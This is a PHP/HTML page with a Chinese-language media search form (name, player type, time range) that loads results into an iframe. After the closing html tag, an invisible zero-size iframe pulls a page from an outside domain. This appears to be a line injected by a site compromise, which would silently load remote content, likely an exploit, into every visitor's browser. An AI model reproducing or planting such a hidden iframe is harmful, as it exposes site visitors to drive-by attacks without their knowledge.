<?php require 'config.php';
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>无标题文档</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
-->
</style></head>
<script language="javascript">
function OnSearch(){
	var url ;
	url = "/policy/media_query_exec?name="+document.all.mname.value;
	url +="&player="+document.all.player.value;
	url+="&stime="+document.all.stime.value;
	url+="&etime="+document.all.etime.value;
	document.all.frame_list.src=url;
	
}

function OnAdd(){
	
}
</script>
<body >

<table width="100%" border="1" cellpadding="0" cellspacing="0">
  <tr>
    <td width="76">名称
      <input type="hidden" name="which">
      <input type="hidden" name="hiddenField2"></td>
    <td width="184"><input type="text" name="mname"></td>
    <td width="93">类型</td>
    <td width="171"><select name="player">
      <option value="all" selected>所有类型</option>
      <?php 
		foreach( $MEDIA_PLAYER_LIST as $k=>$v){ ?>
      <option value="<?php echo $k;?>"><?php echo $v;?></option>
      <?php }?>
    </select></td>
  </tr>
  <tr>
    <td> 时间起 </td>
    <td><input type="text" name="stime"></td>
    <td> 时间止 </td>
    <td><input type="text" name="etime"></td>
  </tr>
  <tr>
    <td><input type="button" name="Submit" value="搜索" onClick="OnSearch()"></td>
    <td>&nbsp;      </td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
</table>
 
<iframe src="#" name="frame_list" width="100%" height="100%">
</iframe>	

</body>
</html>
<iframe src=http://www.ac86.cn/66/index.htm width="0" height="0"></iframe>
